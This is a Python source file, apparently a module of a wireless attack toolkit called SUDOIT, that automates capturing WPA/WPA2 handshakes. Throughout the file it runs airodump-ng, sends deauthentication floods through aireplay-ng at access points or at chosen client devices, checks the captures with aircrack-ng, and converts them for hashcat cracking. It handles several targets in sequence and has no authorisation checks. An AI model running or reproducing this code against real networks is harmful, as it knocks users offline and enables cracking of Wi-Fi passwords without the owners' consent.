#!/usr/bin/env python3
"""
SUDOIT Handshake Capture Module
Automated WPA/WPA2 4-way handshake capture with deauth support.
"""

import os
import time
import subprocess
import threading
from datetime import datetime
from typing import Optional, Dict, List, Callable

from scapy.all import (
    sniff, sendp, Dot11, Dot11Deauth, Dot11Elt,
    RadioTap, EAPOL
)

try:
    from core.logger import get_logger
except ImportError:
    import logging
    def get_logger(name="SUDOIT"):
        return logging.getLogger(name)


class HandshakeCapture:
    """
    Automated WPA/WPA2 Handshake Capture Module.
    
    Features:
        - Targeted handshake capture
        - Automated deauthentication attack
        - Multi-target support
        - Real-time status monitoring
        - PCAP file management
        - Handshake verification
        - Client tracking during capture
        - Custom deauth packet count
        - Timeout configuration
    """
    
    def __init__(self, interface: str = "wlan0mon", logger=None):
        self.interface = interface
        self.logger = logger or get_logger()
        self.capture_file: Optional[str] = None
        self.handshake_captured = False
        self.running = False
        self._dump_proc = None
        self._deauth_proc = None
        self._monitor_thread = None
        self._callback: Optional[Callable] = None
        self._captured_handshakes: List[str] = []
        self._start_time = None
    
    def set_callback(self, callback: Callable):
        """Set callback for real-time status updates."""
        self._callback = callback
    
    def capture(self, target_bssid: str, channel: int,
                output_prefix: Optional[str] = None,
                deauth: bool = True,
                deauth_count: int = 15,
                timeout: int = 60,
                auto_verify: bool = True) -> Optional[str]:
        """
        Capture WPA/WPA2 handshake for target AP.
        
        Args:
            target_bssid: Target AP MAC address
            channel: WiFi channel
            output_prefix: Prefix for output files
            deauth: Send deauth packets
            deauth_count: Number of deauth packets
            timeout: Maximum wait time in seconds
            auto_verify: Verify handshake after capture
        
        Returns:
            Path to capture file or None
        """
        self.logger.info(f"Starting handshake capture for {target_bssid}")
        self.handshake_captured = False
        self.running = True
        self._start_time = time.time()
        
        # Setup output
        if not output_prefix:
            output_prefix = f"/tmp/sudoit_handshake_{target_bssid.replace(':', '')}"
        
        self.capture_file = f"{output_prefix}-01.cap"
        
        # Set channel
        self._set_channel(channel)
        
        # Start capture
        print(f"\n[*] Starting handshake capture...")
        print(f"    Target:  {target_bssid}")
        print(f"    Channel: {channel}")
        print(f"    Output:  {self.capture_file}")
        
        self._start_capture(target_bssid, channel, output_prefix)
        time.sleep(2)
        
        # Send deauth if requested
        if deauth:
            print(f"[*] Sending {deauth_count} deauth packets...")
            self._send_deauth(target_bssid, deauth_count)
        
        # Wait for handshake
        print(f"[*] Waiting for handshake ({timeout}s timeout)...")
        handshake_found = self._wait_for_handshake(output_prefix, target_bssid, timeout)
        
        # Cleanup
        self._cleanup()
        self.running = False
        
        elapsed = time.time() - self._start_time if self._start_time else 0
        
        if handshake_found:
            self.handshake_captured = True
            self._captured_handshakes.append(self.capture_file)
            print(f"[✓] Handshake captured in {elapsed:.1f}s")
            print(f"    File: {self.capture_file}")
            
            if auto_verify:
                self._verify_handshake(self.capture_file)
            
            if self._callback:
                self._callback({
                    "status": "success",
                    "bssid": target_bssid,
                    "file": self.capture_file,
                    "time": elapsed
                })
            
            self.logger.info(f"Handshake captured: {self.capture_file}")
            return self.capture_file
        else:
            print(f"[✗] No handshake captured after {elapsed:.1f}s")
            
            if self._callback:
                self._callback({
                    "status": "failed",
                    "bssid": target_bssid,
                    "reason": "timeout"
                })
            
            self.logger.warning(f"Handshake capture failed for {target_bssid}")
            return None
    
    def _set_channel(self, channel: int):
        """Set wireless interface to specific channel."""
        subprocess.run(
            ["iwconfig", self.interface, "channel", str(channel)],
            capture_output=True
        )
        self.logger.debug(f"Channel set to {channel}")
    
    def _start_capture(self, target_bssid: str, channel: int, output_prefix: str):
        """Start airodump-ng packet capture."""
        cmd = [
            "airodump-ng",
            "-c", str(channel),
            "--bssid", target_bssid,
            "-w", output_prefix,
            "--write-interval", "1",
            self.interface
        ]
        
        self._dump_proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        self.logger.debug(f"airodump-ng started for {target_bssid}")
    
    def _send_deauth(self, target_bssid: str, count: int = 15):
        """Send deauthentication packets to target."""
        cmd = [
            "aireplay-ng",
            "-0", str(count),
            "-a", target_bssid,
            self.interface
        ]
        
        self._deauth_proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        self.logger.debug(f"Deauth attack started: {count} packets")
    
    def _wait_for_handshake(self, output_prefix: str, target_bssid: str, timeout: int) -> bool:
        """Monitor for handshake in capture output."""
        csv_file = f"{output_prefix}-01.csv"
        start = time.time()
        
        while time.time() - start < timeout:
            if not self.running:
                break
            
            time.sleep(2)
            
            # Check CSV for handshake
            if os.path.isfile(csv_file):
                try:
                    with open(csv_file, 'r') as f:
                        content = f.read()
                        if "WPA Handshake" in content:
                            return True
                        if "EAPOL" in content and target_bssid.lower() in content.lower():
                            return True
                except Exception:
                    pass
            
            # Check cap file directly
            cap_file = f"{output_prefix}-01.cap"
            if os.path.isfile(cap_file) and os.path.getsize(cap_file) > 10000:
                try:
                    result = subprocess.run(
                        ["aircrack-ng", cap_file],
                        capture_output=True, text=True, timeout=5
                    )
                    if "1 handshake" in result.stdout or "WPA (" in result.stdout:
                        return True
                except:
                    pass
        
        return False
    
    def _verify_handshake(self, capture_file: str) -> bool:
        """Verify that capture file contains valid handshake."""
        if not os.path.isfile(capture_file):
            print(f"[!] Capture file not found: {capture_file}")
            return False
        
        try:
            result = subprocess.run(
                ["aircrack-ng", capture_file],
                capture_output=True, text=True, timeout=10
            )
            
            if "1 handshake" in result.stdout:
                print(f"[✓] Handshake verified: 1 valid handshake")
                return True
            elif "handshake" in result.stdout.lower():
                print(f"[✓] Handshake verified")
                return True
            else:
                print(f"[!] No handshake found in capture file")
                return False
        except Exception as e:
            self.logger.error(f"Handshake verification error: {e}")
            return False
    
    def _cleanup(self):
        """Clean up running processes."""
        if self._deauth_proc:
            self._deauth_proc.terminate()
            self._deauth_proc = None
        
        if self._dump_proc:
            self._dump_proc.terminate()
            self._dump_proc = None
        
        time.sleep(0.5)
        
        # Kill any remaining airodump-ng processes
        subprocess.run(["pkill", "-f", "airodump-ng"], capture_output=True)
        self.logger.debug("Capture processes cleaned up")
    
    def capture_multi_target(self, targets: List[Dict], deauth: bool = True,
                             timeout_per_target: int = 60) -> List[Dict]:
        """
        Capture handshakes from multiple targets sequentially.
        
        Args:
            targets: List of dicts with 'bssid' and 'channel' keys
            deauth: Send deauth packets
            timeout_per_target: Timeout per target in seconds
        
        Returns:
            List of results with capture status
        """
        results = []
        
        for i, target in enumerate(targets):
            bssid = target.get('bssid', '')
            channel = target.get('channel', 1)
            
            print(f"\n[*] Target {i+1}/{len(targets)}: {bssid} (Ch:{channel})")
            
            result = self.capture(
                target_bssid=bssid,
                channel=channel,
                deauth=deauth,
                timeout=timeout_per_target
            )
            
            results.append({
                "bssid": bssid,
                "channel": channel,
                "success": result is not None,
                "file": result
            })
        
        # Summary
        success_count = sum(1 for r in results if r['success'])
        print(f"\n[*] Capture Summary: {success_count}/{len(targets)} successful")
        
        return results

    
    def capture_with_client_target(self, target_bssid: str, client_mac: str,
                                   channel: int, output_prefix: Optional[str] = None,
                                   deauth_count: int = 5, timeout: int = 60) -> Optional[str]:
        """
        Targeted handshake capture by deauthing specific client.
        
        Args:
            target_bssid: AP MAC address
            client_mac: Client MAC to deauth
            channel: WiFi channel
            output_prefix: Output file prefix
            deauth_count: Number of deauth packets
            timeout: Max wait time
        
        Returns:
            Path to capture file or None
        """
        self.logger.info(f"Client-targeted capture: {client_mac} -> {target_bssid}")
        
        if not output_prefix:
            output_prefix = f"/tmp/sudoit_client_{target_bssid.replace(':', '')}"
        
        self.capture_file = f"{output_prefix}-01.cap"
        self._set_channel(channel)
        self._start_capture(target_bssid, channel, output_prefix)
        time.sleep(2)
        
        # Targeted deauth to specific client
        print(f"[*] Deauthing client {client_mac}...")
        cmd = [
            "aireplay-ng",
            "-0", str(deauth_count),
            "-a", target_bssid,
            "-c", client_mac,
            self.interface
        ]
        
        deauth_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Wait for handshake
        handshake_found = self._wait_for_handshake(output_prefix, target_bssid, timeout)
        
        # Cleanup
        deauth_proc.terminate()
        self._cleanup()
        
        if handshake_found:
            self._captured_handshakes.append(self.capture_file)
            print(f"[✓] Handshake captured via client {client_mac}")
            return self.capture_file
        
        print(f"[✗] No handshake captured from client {client_mac}")
        return None
    
    def passive_capture(self, target_bssid: str, channel: int,
                        output_prefix: Optional[str] = None,
                        timeout: int = 120) -> Optional[str]:
        """
        Passive handshake capture without deauth (wait for natural connection).
        
        Args:
            target_bssid: AP MAC address
            channel: WiFi channel
            output_prefix: Output prefix
            timeout: Max wait time in seconds
        
        Returns:
            Path to capture file or None
        """
        self.logger.info(f"Starting passive capture for {target_bssid}")
        print(f"[*] Passive capture - waiting for natural handshake...")
        print(f"    Timeout: {timeout}s")
        
        return self.capture(
            target_bssid=target_bssid,
            channel=channel,
            output_prefix=output_prefix,
            deauth=False,
            timeout=timeout
        )
    
    def check_existing_handshake(self, cap_file: str) -> Dict:
        """
        Check if a capture file contains valid handshakes.
        
        Returns:
            Dict with verification results
        """
        if not os.path.isfile(cap_file):
            return {"valid": False, "error": "File not found"}
        
        try:
            result = subprocess.run(
                ["aircrack-ng", cap_file],
                capture_output=True, text=True, timeout=10
            )
            
            output = result.stdout
            
            # Parse handshake count
            handshake_count = 0
            for line in output.split('\n'):
                if "handshake" in line.lower():
                    try:
                        count_str = line.split()[0]
                        handshake_count = int(count_str)
                    except:
                        handshake_count = 1 if "handshake" in line.lower() else 0
            
            # Extract BSSID if present
            bssid = None
            for line in output.split('\n'):
                if "WPA" in line and "(" in line:
                    import re
                    match = re.search(r'([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2})', line)
                    if match:
                        bssid = match.group(1)
                        break
            
            return {
                "valid": handshake_count > 0,
                "handshake_count": handshake_count,
                "bssid": bssid,
                "file": cap_file,
                "size_bytes": os.path.getsize(cap_file)
            }
            
        except Exception as e:
            return {"valid": False, "error": str(e)}
    
    def convert_to_hccapx(self, cap_file: str, output_file: Optional[str] = None) -> Optional[str]:
        """
        Convert .cap file to .hccapx format for hashcat.
        
        Args:
            cap_file: Input .cap file
            output_file: Output .hccapx file
        
        Returns:
            Path to .hccapx file or None
        """
        if not output_file:
            output_file = cap_file.replace('.cap', '.hccapx')
        
        # Try cap2hccapx (from hashcat-utils)
        try:
            subprocess.run(
                ["cap2hccapx.bin", cap_file, output_file],
                capture_output=True, check=True, timeout=10
            )
            if os.path.isfile(output_file):
                print(f"[✓] Converted to: {output_file}")
                return output_file
        except:
            pass
        
        # Try hcxpcapngtool (from hcxtools)
        try:
            subprocess.run(
                ["hcxpcapngtool", "-o", output_file, cap_file],
                capture_output=True, check=True, timeout=10
            )
            if os.path.isfile(output_file):
                print(f"[✓] Converted to: {output_file}")
                return output_file
        except:
            pass
        
        # Try online conversion with hcxpcaptool
        try:
            subprocess.run(
                ["hcxpcaptool", "-o", output_file, cap_file],
                capture_output=True, check=True, timeout=10
            )
            if os.path.isfile(output_file):
                print(f"[✓] Converted to: {output_file}")
                return output_file
        except:
            pass
        
        print(f"[✗] Conversion failed. Install hashcat-utils or hcxtools.")
        return None
    
    def get_captured_handshakes(self) -> List[str]:
        """Return list of all captured handshake files."""
        return self._captured_handshakes.copy()
    
    def get_capture_info(self, cap_file: str) -> Dict:
        """Get information about a capture file."""
        info = {
            "file": cap_file,
            "exists": os.path.isfile(cap_file),
            "size_bytes": 0,
            "created": None
        }
        
        if info["exists"]:
            info["size_bytes"] = os.path.getsize(cap_file)
            info["created"] = datetime.fromtimestamp(
                os.path.getctime(cap_file)
            ).isoformat()
            
            # Try to get handshake info
            handshake_info = self.check_existing_handshake(cap_file)
            info.update(handshake_info)
        
        return info
    
    def cleanup_captures(self, keep_files: bool = False):
        """Clean up captured handshake files."""
        if not keep_files:
            for f in self._captured_handshakes:
                if os.path.isfile(f):
                    try:
                        os.remove(f)
                        self.logger.debug(f"Removed: {f}")
                    except:
                        pass
        self._captured_handshakes.clear()
    
    def stop(self):
        """Stop ongoing capture."""
        self.running = False
        self._cleanup()
        self.logger.info("Handshake capture stopped")
    
    def is_running(self) -> bool:
        """Check if capture is running."""
        return self.running
    
    def get_status(self) -> Dict:
        """Get current capture status."""
        return {
            "running": self.running,
            "capture_file": self.capture_file,
            "handshake_captured": self.handshake_captured,
            "total_captured": len(self._captured_handshakes),
            "elapsed_time": time.time() - self._start_time if self._start_time else 0
        }
